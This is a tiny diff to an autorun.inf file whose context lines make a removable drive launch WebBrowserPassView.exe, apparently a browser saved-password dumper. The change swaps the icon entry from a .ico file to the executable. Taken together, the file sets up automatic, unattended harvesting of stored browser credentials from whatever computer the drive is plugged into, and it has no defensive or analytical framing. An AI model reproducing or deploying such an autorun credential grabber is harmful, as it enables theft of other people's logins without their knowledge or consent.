@@ -1,6 +1,6 @@
 [autorun]
 open=WebBrowserPassView.exe
-icon=Webbrowserpassview.ico
+icon=Webbrowserpassview.exe
 label=Running WebBrowserPassView
 
 [Content]
